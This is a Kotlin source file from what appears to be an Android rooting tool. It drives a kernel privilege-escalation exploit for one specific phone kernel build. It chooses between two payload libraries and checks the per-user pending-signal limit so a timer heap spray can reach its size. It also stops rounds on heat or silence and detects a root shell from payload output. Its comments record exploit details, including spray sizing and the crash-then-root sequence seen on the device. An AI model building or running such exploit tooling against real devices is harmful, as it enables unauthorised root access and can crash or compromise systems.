package com.ghostlock.app.data.payload

/**
 * CVE-2026-64560 payload bridge.
 *
 * The Find N5 release `6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k` ships the
 * rtmutex fix for CVE-2026-43499, so no in-process pipeline can run there: the
 * extractor gate reports `already_fixed`. The 64560 primitive on that build
 * lives in a self-contained payload that performs its own race, controlled
 * write and credential patch.
 *
 * GhostLock owns only the decisions around it: which payload an invocation
 * uses, whether the run can possibly succeed on this process, when the round
 * stops, and how a payload line maps to an outcome. The payload owns the
 * kernel primitive; GhostLock must never claim a write it did not verify.
 *
 * One invocation is one payload process on the current boot. The validated
 * recipe (device gate 2026-10-22, Find N5 `gc4127a25dcf3`) started every
 * attempt on a freshly booted kernel: round 1 missed, round 2 panicked the
 * kernel, round 3 held a root child. A miss leaves the sprayed slab state
 * dirty, so the caller re-invokes after the reboot instead of looping here.
 */
object PayloadBridge {
    /** Kernel release fragment of the only build this bridge is validated for. */
    const val FindN5KernelMarker = "gc4127a25dcf3"

    /** Timer fan-out variant; the one that reached a hold on the device gate. */
    const val FanoutPayload = "libn5fanout.so"

    /** Timer slot rotation variant. */
    const val RotatePayload = "libn5rotate.so"

    /** Payload reached an interactive root child; this is the only success marker. */
    const val HoldMarker = "ROOT_CHILD_HOLD_PASS"

    /** Payload refused this device; another invocation cannot change that. */
    const val RejectMarker = "TARGET_PROFILE_GATE_FAIL"

    /** Payload self-check passed without touching the kernel. */
    const val PreflightMarker = "PREFLIGHT_PASS"

    /**
     * Timer count the validated payload build bakes in.
     *
     * `timer_create()` charges `sigqueue_alloc()` against `RLIMIT_SIGPENDING`
     * per uid, so this number must fit under the shell uid's `Max pending
     * signals` ceiling. A build asking for more than the ceiling fills the
     * spray only partially, reclaim never lines up, and every attempt ends in
     * `BOOTID_WRITE_MISS`. The 55478 build was unrunnable for exactly this
     * reason; the 40000 build fits under the 41381 ceiling.
     */
    const val TimerGoal = 40000

    /** How one payload invocation ended. */
    enum class Outcome {
        /** Root child is live. */
        Hold,

        /** Payload gate rejected this device; stop the whole run. */
        Rejected,

        /** Payload exited without a hold. */
        Exited,

        /** Budget spent with the payload still running and silent. */
        Stalled,
    }

    /** One invocation: per-round budget, silence limit and heat gates. */
    data class Plan(
        val budgetSeconds: Int = 900,
        val stallSeconds: Int = 20,
        val gateMilliCelsius: Int = 58000,
        val panicMilliCelsius: Int = 75000,
    ) {
        init {
            require(budgetSeconds > 0) { "budgetSeconds must be positive" }
            require(stallSeconds > 0) { "stallSeconds must be positive" }
            require(gateMilliCelsius > 0) { "gateMilliCelsius must be positive" }
            require(panicMilliCelsius > gateMilliCelsius) {
                "panic gate must sit above the fire gate"
            }
        }
    }

    /** True when [release] is the build this bridge was validated on. */
    fun isFindN5Kernel(release: String): Boolean = release.contains(FindN5KernelMarker)

    /**
     * Payload for one invocation. The choice is explicit and comes from the
     * caller; it is never inferred from kernel metadata.
     */
    fun payloadFor(rotate: Boolean): String = if (rotate) RotatePayload else FanoutPayload

    /** Terminal outcome carried by [line], or null for a plain progress line. */
    fun classify(line: String): Outcome? = when {
        line.contains(HoldMarker) -> Outcome.Hold
        line.contains(RejectMarker) -> Outcome.Rejected
        else -> null
    }

    /** True when the round must stop immediately instead of burning its budget. */
    fun isTerminal(outcome: Outcome?): Boolean =
        outcome == Outcome.Hold || outcome == Outcome.Rejected

    /**
     * Soft `Max pending signals` limit from `/proc/self/limits`, or 0 when the
     * line is missing. The payload child inherits these limits from this
     * process, which is why the check reads them here and not inside the
     * payload.
     */
    fun maxPendingSignals(limits: String): Int {
        val line = limits.lineSequence()
            .firstOrNull { it.trimStart().startsWith("Max pending signals") }
            ?: return 0
        return line.trim().split(Regex("\\s+"))
            .firstOrNull { token -> token.isNotEmpty() && token.all(Char::isDigit) }
            ?.toIntOrNull()
            ?: 0
    }

    /**
     * True when the spray can reach [TimerGoal] on this process. Unreadable
     * limits fail the gate: a run that cannot fill the spray burns the boot for
     * nothing, and the caller has no way to tell that from a genuine miss.
     */
    fun timerBudgetFits(limits: String): Boolean = maxPendingSignals(limits) >= TimerGoal
}
